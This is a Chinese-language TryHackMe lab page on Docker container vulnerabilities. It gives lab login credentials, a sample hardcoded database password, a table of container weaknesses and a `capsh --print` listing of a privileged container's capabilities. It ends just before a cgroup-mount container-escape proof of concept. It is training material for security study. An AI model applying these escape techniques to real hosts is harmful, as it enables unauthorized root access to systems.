<!doctype html>
<html lang="zh" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-Modules/Container Security/Container Vulnerabilities" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.9.2">
<title data-rh="true">容器漏洞 | TryHackMe-CN</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/Container Security/Container Vulnerabilities"><meta data-rh="true" property="og:locale" content="zh"><meta data-rh="true" property="og:locale:alternate" content="en"><meta data-rh="true" name="docusaurus_locale" content="zh"><meta data-rh="true" name="docsearch:language" content="zh"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="容器漏洞 | TryHackMe-CN"><meta data-rh="true" name="description" content="任务 1 简介（部署）"><meta data-rh="true" property="og:description" content="任务 1 简介（部署）"><link data-rh="true" rel="icon" href="/TryHackMe-CN/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/Container Security/Container Vulnerabilities"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/en/docs/Modules/Container Security/Container Vulnerabilities" hreflang="en"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/Container Security/Container Vulnerabilities" hreflang="zh"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/Container Security/Container Vulnerabilities" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"模块","item":"https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/"},{"@type":"ListItem","position":2,"name":"容器安全","item":"https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/Container Security/"},{"@type":"ListItem","position":3,"name":"容器漏洞","item":"https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/Container Security/Container Vulnerabilities"}]}</script><link rel="alternate" type="application/rss+xml" href="/TryHackMe-CN/blog/rss.xml" title="TryHackMe-CN RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/TryHackMe-CN/blog/atom.xml" title="TryHackMe-CN Atom Feed"><link rel="stylesheet" href="/TryHackMe-CN/assets/css/styles.6c4c8a38.css">
<script src="/TryHackMe-CN/assets/js/runtime~main.c53a8494.js" defer="defer"></script>
<script src="/TryHackMe-CN/assets/js/main.fab95784.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||"light"),document.documentElement.setAttribute("data-theme-choice",t||"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/TryHackMe-CN/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/TryHackMe-CN/"><div class="navbar__logo"><img src="/TryHackMe-CN/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/TryHackMe-CN/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">My Site</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/TryHackMe-CN/docs/Modules/">Tutorial</a><a class="navbar__item navbar__link" href="/TryHackMe-CN/blog">Blog</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link"><svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true" class="iconLanguage_nlXk"><path fill="currentColor" d="M12.87 15.07l-2.54-2.51.03-.03c1.74-1.94 2.98-4.17 3.71-6.53H17V4h-7V2H8v2H1v1.99h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12zm-2.62 7l1.62-4.33L19.12 17h-3.24z"></path></svg>简体中文</a><ul class="dropdown__menu"><li><a href="/TryHackMe-CN/en/docs/Modules/Container Security/Container Vulnerabilities" target="_self" rel="noopener noreferrer" class="dropdown__link" lang="en">English</a></li><li><a href="/TryHackMe-CN/docs/Modules/Container Security/Container Vulnerabilities" target="_self" rel="noopener noreferrer" class="dropdown__link dropdown__link--active" lang="zh">简体中文</a></li></ul></div><a href="https://github.com/TryHackMyOffsecBox/TryHackMe-CN" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="切换浅色/暗黑模式（当前为system mode）"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" href="/TryHackMe-CN/docs/Modules/"><span title="模块" class="categoryLinkLabel_W154">模块</span></a><button aria-label="折叠侧边栏分类 &#x27;模块&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/docs/Modules/Command Line/"><span title="命令行" class="categoryLinkLabel_W154">命令行</span></a><button aria-label="展开侧边栏分类 &#x27;命令行&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" tabindex="0" href="/TryHackMe-CN/docs/Modules/Container Security/"><span title="容器安全" class="categoryLinkLabel_W154">容器安全</span></a><button aria-label="折叠侧边栏分类 &#x27;容器安全&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/TryHackMe-CN/docs/Modules/Container Security/Intro to Containerisation"><span title="容器化入门" class="linkLabel_WmDU">容器化入门</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/TryHackMe-CN/docs/Modules/Container Security/Intro to Docker"><span title="Docker入门" class="linkLabel_WmDU">Docker入门</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/TryHackMe-CN/docs/Modules/Container Security/Intro to Kubernetes"><span title="Kubernetes 简介" class="linkLabel_WmDU">Kubernetes 简介</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/TryHackMe-CN/docs/Modules/Container Security/Container Vulnerabilities"><span title="容器漏洞" class="linkLabel_WmDU">容器漏洞</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/TryHackMe-CN/docs/Modules/Container Security/Container Hardening"><span title="容器加固" class="linkLabel_WmDU">容器加固</span></a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/TryHackMe-CN/docs/Modules/Microsoft Defender XDR/"><span title="Microsoft Defender XDR" class="categoryLinkLabel_W154">Microsoft Defender XDR</span></a><button aria-label="展开侧边栏分类 &#x27;Microsoft Defender XDR&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/TryHackMe-CN/docs/Networks/"><span title="网络" class="categoryLinkLabel_W154">网络</span></a><button aria-label="展开侧边栏分类 &#x27;网络&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/TryHackMe-CN/docs/"><span title="index" class="linkLabel_WmDU">index</span></a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/TryHackMe-CN/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/TryHackMe-CN/docs/Modules/"><span>模块</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/TryHackMe-CN/docs/Modules/Container Security/"><span>容器安全</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">容器漏洞</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>容器漏洞</h1></header>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="任务-1-简介部署">任务 1 简介（部署）<a href="#任务-1-简介部署" class="hash-link" aria-label="任务 1 简介（部署）的直接链接" title="任务 1 简介（部署）的直接链接" translate="no">​</a></h2>
<p>本房间将演示 Docker 容器中发现的一些常见漏洞，以及攻击者如何利用这些漏洞进行逃逸。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="学习目标">学习目标<a href="#学习目标" class="hash-link" aria-label="学习目标的直接链接" title="学习目标的直接链接" translate="no">​</a></h3>
<p>在本房间中，您将学习以下内容：</p>
<ul>
<li class="">Docker 容器中可能存在的一些漏洞。</li>
<li class="">作为攻击者，您可以通过利用这些漏洞获得什么。</li>
<li class="">为什么这些漏洞会存在（即配置错误）。</li>
<li class="">如何在 Docker 容器中搜索漏洞。</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="先决条件">先决条件<a href="#先决条件" class="hash-link" aria-label="先决条件的直接链接" title="先决条件的直接链接" translate="no">​</a></h3>
<p>在继续之前，强烈建议您已完成 Docker 入门房间，并熟悉 Linux CLI。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="重要背景">重要背景<a href="#重要背景" class="hash-link" aria-label="重要背景的直接链接" title="重要背景的直接链接" translate="no">​</a></h3>
<p>本房间重点利用 Docker 守护进程本身，这通常依赖于在容器内拥有提升的权限。 换句话说，本房间假设您已在容器中成功成为 root 用户。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="部署本房间的易受攻击机器">部署本房间的易受攻击机器<a href="#部署本房间的易受攻击机器" class="hash-link" aria-label="部署本房间的易受攻击机器的直接链接" title="部署本房间的易受攻击机器的直接链接" translate="no">​</a></h3>
<p>按下此任务右上角的绿色“启动机器”按钮。 您可以通过 TryHackMe AttackBox 或将自己的机器连接到 TryHackMe 网络，使用以下凭据访问该机器。 您将使用此机器回答本房间各任务中的问题。</p>
<table><thead><tr><th style="text-align:center">键</th><th style="text-align:center">值</th></tr></thead><tbody><tr><td style="text-align:center">用户名</td><td style="text-align:center">root</td></tr><tr><td style="text-align:center">密码</td><td style="text-align:center">tryhackme123!</td></tr><tr><td style="text-align:center">IP</td><td style="text-align:center">MACHINE_IP</td></tr></tbody></table>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>回答以下问题</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 完成我以继续本房间！ </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="任务-2-容器漏洞-101">任务 2 容器漏洞 101<a href="#任务-2-容器漏洞-101" class="hash-link" aria-label="任务 2 容器漏洞 101的直接链接" title="任务 2 容器漏洞 101的直接链接" translate="no">​</a></h2>
<p>在开始之前，有必要回顾一下在<a href="https://tryhackme.com/room/introtocontainerisation" target="_blank" rel="noopener noreferrer" class="">容器化入门</a>房间中学到的一些内容。 首先，让我们回顾一下容器是隔离的，并且具有最小化的环境。 下图描绘了一个容器的环境。</p>
<p><img decoding="async" loading="lazy" alt="说明单个计算机上的三个容器" src="/TryHackMe-CN/assets/images/image_20251122-192221-75d997850a0db739277c7cf809a88e6c.png" width="1198" height="960" class="img_ev3q"></p>
<p><strong>需要注意的一些重要事项是：</strong></p>
<p>即使您有权访问（即立足点）容器，也不意味着您有权访问主机操作系统及相关文件或其他容器。</p>
<p>由于容器的最小化特性（即它们只有开发人员指定的工具），您不太可能找到基本工具，如 Netcat、Wget 甚至 Bash！ 这使得攻击者在容器内进行交互相当困难。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="我们预期在-docker-容器中找到哪些类型的漏洞">我们预期在 Docker 容器中找到哪些类型的漏洞<a href="#我们预期在-docker-容器中找到哪些类型的漏洞" class="hash-link" aria-label="我们预期在 Docker 容器中找到哪些类型的漏洞的直接链接" title="我们预期在 Docker 容器中找到哪些类型的漏洞的直接链接" translate="no">​</a></h3>
<p>虽然 Docker 容器旨在将应用程序彼此隔离，但它们仍然可能易受攻击。 例如，应用程序的硬编码密码可能仍然存在。 如果攻击者能够通过易受攻击的 Web 应用程序获得访问权限，例如，他们将能够找到这些凭据。 您可以在下面的代码片段中看到一个包含数据库服务器硬编码凭据的 Web 应用程序示例：</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">/** Database hostname */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">define</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> </span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;DB_HOST&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;localhost&#x27;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">/** Database name */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">define</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> </span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;DB_NAME&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;sales&#x27;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">/** Database username */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">define</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> </span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;DB_USER&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;production&#x27;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">/** Database password */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">define</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> </span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;DB_PASSWORD&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string single-quoted-string" style="color:#e3116c">&#x27;SuperstrongPassword321!&#x27;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>当然，这不是容器中唯一可被利用的漏洞。 其他潜在的攻击向量已在下表中列出。</p>
<table><thead><tr><th style="text-align:left">漏洞</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">配置错误的容器</td><td style="text-align:left">配置错误的容器将具有容器操作不需要的权限。 例如，以“特权”模式运行的容器将有权访问主机操作系统 - 移除了隔离层。</td></tr><tr><td style="text-align:left">易受攻击的镜像</td><td style="text-align:left">曾多次发生流行的 Docker 镜像被植入后门以执行恶意操作（如加密货币挖矿）的事件。</td></tr><tr><td style="text-align:left">网络连接</td><td style="text-align:left">未正确联网的容器可能暴露在互联网上。 例如，Web 应用程序的数据库容器应仅对 Web 应用程序容器可访问 - 而不是互联网。<br>此外，容器可以成为横向移动的一种方法。 一旦攻击者有权访问一个容器，他们可能能够与主机上未暴露到网络的其他容器交互。</td></tr></tbody></table>
<p>这只是容器中可能存在的一些漏洞类型的简要总结。 本房间的任务将深入探讨这些内容！</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>回答以下问题</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 点击进入下一个任务！ </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="任务-3-漏洞-1特权容器能力">任务 3 漏洞 1：特权容器（能力）<a href="#任务-3-漏洞-1特权容器能力" class="hash-link" aria-label="任务 3 漏洞 1：特权容器（能力）的直接链接" title="任务 3 漏洞 1：特权容器（能力）的直接链接" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="理解能力">理解能力<a href="#理解能力" class="hash-link" aria-label="理解能力的直接链接" title="理解能力的直接链接" translate="no">​</a></h3>
<p>从根本上说，Linux 能力是授予 Linux 内核内进程或可执行文件的 root 权限。 这些特权允许细粒度地分配权限 - 而不是一次性分配所有权限。</p>
<p>这些能力决定了 Docker 容器对操作系统具有哪些权限。 Docker 容器可以在两种模式下运行：</p>
<ul>
<li class="">用户（普通）模式</li>
<li class="">特权模式</li>
</ul>
<p>在下图中，我们可以看到两种不同模式的运行情况以及每种模式对主机的访问级别：</p>
<p><img decoding="async" loading="lazy" alt="说明不同容器模式和特权及其对操作系统的访问级别。" src="/TryHackMe-CN/assets/images/image_20251128-192822-623610a5d26526f2730d762d36089016.png" width="1198" height="960" class="img_ev3q"></p>
<p>请注意容器 #1 和 #2 以“用户/普通”模式运行，而容器 #3 以“特权”模式运行。 “用户”模式下的容器通过 Docker 引擎与操作系统交互。 然而，特权容器不这样做。 相反，它们绕过 Docker 引擎，直接与操作系统通信。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="这对我们意味着什么">这对我们意味着什么<a href="#这对我们意味着什么" class="hash-link" aria-label="这对我们意味着什么的直接链接" title="这对我们意味着什么的直接链接" translate="no">​</a></h3>
<p>嗯，如果容器以对操作系统的特权访问运行，我们实际上可以在主机上以 root 身份执行命令。</p>
<p>我们可以使用诸如 <code>capsh</code> 这样的实用程序（随 libcap2-bin 包提供）来列出我们容器的能力：<code>capsh --print</code>。 能力在 Linux 中用于向进程分配特定权限。 列出容器的能力是确定可进行的系统调用和潜在利用机制的好方法。</p>
<p>下面终端片段中提供了一些值得关注的能力。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Listing capabilities of a privileged Docker Container</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic@privilegedcontainer:~$ capsh </span><span class="token parameter variable" style="color:#36acaa">--print</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Current: </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> cap_chown, cap_sys_module, cap_sys_chroot, cap_sys_admin, cap_setgid,cap_setuid</span><br></span></code></pre></div></div>
<p>在下面的漏洞利用示例中，我们将使用挂载系统调用（由容器的能力允许）将主机的控制组挂载到容器中。</p>
<p>下面的代码片段基于（但经过修改）<a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so." target="_blank" rel="noopener noreferrer" class="">Trailofbits 创建的概念验证 (PoC)</a>，该 PoC 详细描述了此漏洞利用的内部工作原理。</p>
<hr>
